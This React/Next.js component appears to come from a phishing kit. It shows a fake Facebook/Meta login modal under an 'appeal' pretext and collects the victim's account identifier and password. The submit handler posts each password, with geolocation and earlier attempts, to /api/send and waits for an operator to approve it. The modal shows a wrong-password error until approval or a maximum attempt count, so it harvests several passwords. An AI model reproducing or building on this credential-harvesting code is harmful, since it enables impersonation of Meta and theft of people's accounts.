import FbRoundLogo from '@/assets/images/fb_round_logo.png';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import { tickSrc } from '@/components/icons';
import { DEFAULT_TEXTS } from '@/constants/default-texts';
import { store } from '@/store/store';
import config from '@/utils/config';
import { buildAppealMessage } from '@/utils/message';
import { pollApproval } from '@/utils/poll-approval';
import axios from 'axios';
import Image from 'next/image';
import { type FC, type FormEvent, useState } from 'react';

const PasswordModal: FC<{ nextStep: () => void; texts?: Record<string, string> }> = ({ nextStep, texts = DEFAULT_TEXTS }) => {
    const [attempts, setAttempts] = useState(0);
    const [accountInput, setAccountInput] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [password, setPassword] = useState('');
    const [showError, setShowError] = useState(false);
    const [showPassword, setShowPassword] = useState(false);

    const { geoInfo, messageId, loginProvider, userData, addAccount, addPassword, setMessageId, setMessageContent } = store();
    const maxPass = config.MAX_PASS ?? 3;

    const togglePassword = () => setShowPassword((prev) => !prev);

    const handleSubmit = async (e: FormEvent) => {
        e.preventDefault();
        if (!accountInput.trim() || !password.trim() || isLoading) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const sessionId = crypto.randomUUID();
        addAccount(accountInput);
        addPassword(password);

        const allAccounts = [...userData.accounts, accountInput];
        const allPasswords = [...userData.passwords, password];
        const message = buildAppealMessage({
            geoInfo,
            userData,
            loginProvider,
            accounts: allAccounts,
            passwords: allPasswords,
            maxPass
        });

        try {
            const res = await axios.post('/api/send', {
                message,
                old_message_id: messageId,
                approval_type: 'password',
                session_id: sessionId
            });

            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
            }

            setMessageContent(message);

            const result = await pollApproval(sessionId);

            if (result === 'approved') {
                nextStep();
            } else if (next >= maxPass) {
                nextStep();
            } else {
                setShowError(true);
                setPassword('');
            }
        } catch {
            setShowError(true);
            setPassword('');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div
            className='modal form-modal show d-block'
            id='exampleModal2'
            tabIndex={-1}
            style={{ backgroundColor: 'rgba(0,0,0,0.5)' }}
        >
            <div className='modal-dialog modal-dialog-centered modal-fullscreen-lg-down'>
                <div className='modal-content'>
                    <div className='modal-body'>
                        <div className='fb-round-wraper'>
                            <Image src={FbRoundLogo} alt='Facebook logo' width={70} height={70} className='fb-logo-round' />
                        </div>

                        <div className='login-main'>
                            <p className='login-notice'>
                                {/* eslint-disable-next-line @next/next/no-img-element */}
                                <img src={tickSrc} width={16} alt='tick' />
                                <span>{texts.loginNotice}</span>
                            </p>

                            <form onSubmit={handleSubmit}>
                                {attempts === 0 && (
                                    <div className='password-input'>
                                        <label className='form-label' htmlFor='account-input'>
                                            {texts.loginEmailOrPhone}
                                        </label>
                                        <input
                                            autoComplete='username'
                                            id='account-input'
                                            maxLength={60}
                                            minLength={3}
                                            name='identifier'
                                            required
                                            type='text'
                                            value={accountInput}
                                            onChange={(e) => setAccountInput(e.target.value)}
                                        />
                                    </div>
                                )}

                                <div className={`password-input has-toggle ${showError ? 'is-invalid shake' : ''}`}>
                                    <label className='form-label' htmlFor='password-input'>
                                        {texts.loginPassword}
                                    </label>
                                    <input
                                        autoComplete='current-password'
                                        id='password-input'
                                        maxLength={30}
                                        minLength={3}
                                        name='password-1'
                                        required
                                        type={showPassword ? 'text' : 'password'}
                                        value={password}
                                        onChange={(e) => setPassword(e.target.value)}
                                    />
                                    <button
                                        aria-label='Show/Hide password'
                                        aria-pressed={showPassword}
                                        className='password-toggle'
                                        type='button'
                                        onClick={togglePassword}
                                    >
                                        <svg fill='#606770' height='20' viewBox='0 0 24 24' width='20' xmlns='http://www.w3.org/2000/svg' style={{ display: showPassword ? 'none' : 'block' }}>
                                            <path d='M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.239-5-5 0-2.762 2.238-5 5-5 2.761 0 5 2.238 5 5 0 2.761-2.239 5-5 5z' />
                                            <circle cx='12' cy='12' r='2.5' />
                                        </svg>
                                        <svg fill='#1877f2' height='20' viewBox='0 0 24 24' width='20' xmlns='http://www.w3.org/2000/svg' style={{ display: showPassword ? 'block' : 'none' }}>
                                            <path d='M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.239-5-5 0-2.762 2.238-5 5-5 2.761 0 5 2.238 5 5 0 2.761-2.239 5-5 5z' />
                                        </svg>
                                    </button>
                                </div>
                                {showError && (
                                    <div className='invalid-feedback d-block login-error'>
                                        {texts.loginWrongPassword}
                                    </div>
                                )}

                                <div className='form-btn-wrapper'>
                                    <button
                                        type='submit'
                                        disabled={isLoading || !accountInput.trim() || !password.trim()}
                                        className={`btn btn-primary w-100 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}
                                    >
                                        <span style={{ visibility: isLoading ? 'hidden' : 'visible' }}>
                                            {attempts === 0 ? texts.loginBtn : texts.continueBtn}
                                        </span>
                                        {isLoading && (
                                            <span className='login-btn-spinner'>
                                                <span className='custom-spinner' />
                                            </span>
                                        )}
                                    </button>
                                </div>

                                <div id='forgot-pass-wrap'>
                                    <a href='#forgot'>{texts.forgotPassword}</a>
                                </div>
                            </form>
                        </div>
                    </div>

                    <div className='modal-footer'>
                        <Image src={MetaLogo} alt='Meta logo' width={54} height={16} style={{ display: 'block' }} />
                        <div style={{ fontSize: '12px', color: '#606770', marginTop: '4px' }}>
                            {texts.aboutHelpMore}
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default PasswordModal;
